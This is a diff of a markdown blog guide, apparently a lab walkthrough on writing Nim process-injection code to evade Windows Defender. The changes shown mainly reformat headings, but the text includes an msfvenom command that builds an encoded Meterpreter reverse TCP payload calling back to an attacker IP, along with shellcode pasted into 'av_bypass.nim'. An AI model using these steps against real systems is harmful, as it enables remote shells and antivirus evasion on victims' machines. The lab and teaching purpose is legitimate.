@@ -39,7 +39,9 @@ For this project I used a Windows 10 laptop to run two Virtual Machines as follo
 
 ![](/images/nim_proc_inject_pt1/1. lab_setup.png "Lab Setup")
 
-Development Machine:  Windows 10 Home Version 21H1 (OS Build 19043.1110), fully updated with Windows Defender and MalwareBytes as antivirus options.  Windows Defender was turned on with the exception of "Automatic sample submission" throughout this project.
+#### Development Machine 
+
+Windows 10 Home Version 21H1 (OS Build 19043.1110), fully updated with Windows Defender and MalwareBytes as antivirus options.  Windows Defender was turned on with the exception of "Automatic sample submission" throughout this project.
 
 During the guide we will install the following additional software on the Development Machine:
 
@@ -52,9 +54,13 @@ During the guide we will install the following additional software on the Develo
 -4- MingW compiler from the Nim website
     
 
-Attacker Machine:  Kali Linux or Parrot OS.  Really anything that can run Metasploit as we will use msfvenom and msfconsole to make this part easier on ourselves.  For this project I used Kali Linux 2021, with root user access and Metasploit Framework 5.
+#### Attacker Machine
 
-Victim Machine:  Windows 10 machine or VM with an unprivileged user account and Windows Defender enabled with all options turned on except automatic sample submission.  The specific VM I used is a Windows 10 Enterprise VM on an Active Directory Lab I built, Windows Version 21H1 OS Build 19043.1110.  During the walkthrough I used a local user (non-domain user) without administrative privileges. The .iso used to initially install and then update Windows was from the Microsoft Windows 10 Enterprise Evaluation Center:  https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise 
+Kali Linux or Parrot OS.  Really anything that can run Metasploit as we will use msfvenom and msfconsole to make this part easier on ourselves.  For this project I used Kali Linux 2021, with root user access and Metasploit Framework 5.
+
+#### Victim Machine
+
+Windows 10 machine or VM with an unprivileged user account and Windows Defender enabled with all options turned on except automatic sample submission.  The specific VM I used is a Windows 10 Enterprise VM on an Active Directory Lab I built, Windows Version 21H1 OS Build 19043.1110.  During the walkthrough I used a local user (non-domain user) without administrative privileges. The .iso used to initially install and then update Windows was from the Microsoft Windows 10 Enterprise Evaluation Center:  https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise 
 
 I did not include instructions on VM/network setup in this guide so this is completely up to you.  Make sure the Attacker and Victim VMs are on the same network and can ping each other.
 
@@ -66,12 +72,16 @@ I did not include instructions on VM/network setup in this guide so this is comp
 =======================================================
 
 
-Attacker machine:  Default install of Kali Linux or Parrot OS is fine.  Again all we need is access to Metasploit Framework 5 so this guide does not cover baseline setup for the Attacker Machine.  Specific steps to configure Metasploit to receive our Meterpreter reverse TCP connection are covered in the Section 6: Execution.
+#### Attacker machine
 
-Victim Machine:  Nothing to do just yet.  Again, just ensure the Attacker and Victim Machines can ping each other.
+Default install of Kali Linux or Parrot OS is fine.  Again all we need is access to Metasploit Framework 5 so this guide does not cover baseline setup for the Attacker Machine.  Specific steps to configure Metasploit to receive our Meterpreter reverse TCP connection are covered in the Section 6: Execution.
+
+#### Victim Machine
+
+Nothing to do just yet.  Again, just ensure the Attacker and Victim Machines can ping each other.
 
 
-Development Machine:  
+#### Development Machine
 
 Install git:  https://git-scm.com/download/win
 
@@ -479,7 +489,9 @@ You will see these functions appear in our Nim code below, but I will not discus
 
 First, we need some shellcode to inject and then execute.  To prepare our shellcode we will use our Attacker Machine to run an msfvenom command that will output the shellcode to a file.  We need to know the IP address of the Attacker Machine and an unused TCP port we will run our Metasploit listener on.  In my case these are 192.168.3.28 and 1701 respectively.  Your IP address will likely be different, and feel free to choose a different port number as long as it is not already in use.
 
-Attacker Machine in a terminal window:
+#### Attacker Machine 
+
+In a terminal window:
 
     msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.3.28 LPORT=1701 -f csharp -e x64/zutto_dekiru -i 2 > code.out
 
@@ -503,7 +515,9 @@ LPORT=1701  :  Set the TCP port to connect to as 1701.
 
 ![](/images/nim_proc_inject_pt1/37. msfvenom.png)
 
-Back on your Development Machine, we need two items from the output.  The first is the final Payload size, in my case 201391 bytes (yours may be different).  The second is the payload itself which is in the code.out file.  First let's update our code with some additional comments to document what we are doing.  This code should start immediately following the end of the C++ code section:
+#### Development Machine
+
+We need to use two items from the output of the msfvenom command.  The first is the final Payload size, in my case 201391 bytes (yours may be different).  The second is the payload itself which is in the code.out file.  First let's update our code with some additional comments to document what we are doing.  This code should start immediately following the end of the C++ code section:
 
     ### begin process injection code
     
@@ -534,8 +548,9 @@ The shellcode itself will take a bit more to get into our code file.  As you can
 trimmed
 ![](/images/nim_proc_inject_pt1/39. shellcode2.png)
 
+#### Attacker Machine
 
-Back on our Attacker Machine, we use a text editor to remove the first line:  "byte[] buf = new byte[201391] { "
+We use a text editor to remove the first line:  "byte[] buf = new byte[201391] { "
 
 Also remove the " }; " at the end of the file.  
 
@@ -562,9 +577,9 @@ tr  :  Truncate command.
 
 \> code_stripped.out  :  Place the output of this command into the file code_stripped.out.
 
-
+#### Developer Machine
+    
 Now, you can drag and drop code_stripped.out over to your Development Machine, open it, and copy/paste the shellcode into av_bypass.nim.  I have trimmed the output here to fit in the code box.  Your actual code will be several thousand lines:
-
 
     var shellcode: array[201391, byte] = [ byte 0xd9,0xc3,0x48,0xbb,0xd3,0x76,0x8b,0x6e,0xea,0xe9,0xaa,0x6b,0x54,0x4d,0x31,0xed,0x41,0x5c,0x66,0x41,0xbd,0x4f,0x62,0x66,0x41,0x81,0xe4,0x10,0xf6,0x49,0x0f,0xae,0x04,0x24,0x49,0x83,0xc4,0x08,0x49,0x8b,0x3c,0x24,0x49,0xff,0xcd,0x4a,0x31,0x5c,0xef,0x37,0x4d,0x85,0xed,0x75,0xf3,0x9b,0xff,0x68,0x08,0x6b,0x0a,0xda,0x91,0x9b,0x47,0x42,0x26,0x52,0xf9,0xb6,0x77,0x62,0x64,0xec,0xed,0xb7,0x30,0x66,0x23,0xdc,0xd8,0x88,0x08,0x53,0xa0,0xc8,0x23,0x58,0x05,0x83,0x26,0x15,0x20,0xe2,0x5a,0x97,0xb8,0x90,0x26,0x6f,0x20,0xdf,0x98,0x8e,0x30,0xd6,0x8d,0xad,0xc6,0xa0,0xd3,0x8b,0xe9,0x7b,0xff,0xb0,0x0d,0xcd,0xc6,0x2b,0x6a,0x97,0xdf,0xf8,0xd5,0x61,0xb7,0x00,0xdd,0xc0,0xdf,0xf8,0x71,0xfa,0x7e,0x42,0xa9,0xa3,0x69,0xfa,0x8e,0x60,0xbf,0x1b
     output trimmed
